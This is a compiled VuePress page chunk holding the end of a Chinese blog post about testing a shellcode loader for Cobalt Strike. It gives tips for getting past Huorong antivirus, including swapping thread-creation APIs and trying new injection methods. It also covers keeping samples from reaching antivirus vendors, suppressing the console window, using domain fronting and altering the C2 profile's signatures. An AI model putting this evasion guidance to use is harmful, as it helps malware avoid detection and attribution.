"),t("p",[t("img",{attrs:{src:"/images/image-20200725203712920.png",alt:""}})]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/image-20200725204100044.png",alt:""}})]),s._v(" "),t("p",[t("img",{attrs:{src:"/images/image-20200725204247935.png",alt:""}})]),s._v(" "),t("p",[t("strong",[s._v("最后注意！！！")])]),s._v(" "),t("p",[s._v("我写代码的时候机器开着火绒呢，一开始我用的CreateThread直接给我干掉了;")]),s._v(" "),t("p",[s._v("后来改成CreateRemoteThread，火绒还是能识别出木马释放程序；")]),s._v(" "),t("p",[s._v("解决方法：1、再找其它可以替代的函数； 2、寻找新的注入方式")]),s._v(" "),t("p",[s._v("还有就是我这次做实验的时候太奔放了，全程开着杀软网没断；")]),s._v(" "),t("p",[s._v("正确的做法是更新完杀软然后断网，创建虚拟机快照，测完后恢复快照；")]),s._v(" "),t("p",[s._v("否则杀软会镜像流量，等下次开机样本就会被上传出去。")]),s._v(" "),t("blockquote",[t("p",[s._v("这个加载器运行时会弹一个黑框输出shellcode的长度，实际使用记得修改为不让它弹窗")])]),s._v(" "),t("h1",{attrs:{id:"三、使用域前置"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#三、使用域前置"}},[s._v("#")]),s._v(" 三、使用域前置")]),s._v(" "),t("p",[s._v("由于是测试，跳过了这一步，直接用了C2的IP")]),s._v(" "),t("p",[s._v("域前置方法参考以下链接：")]),s._v(" "),t("p",[s._v("https://www.anquanke.com/post/id/195011")]),s._v(" "),t("blockquote",[t("p",[s._v("另外CS的Profie也要自己修改一下特征")])])])}),[],!1,null,null,null);n.default=e.exports}}]);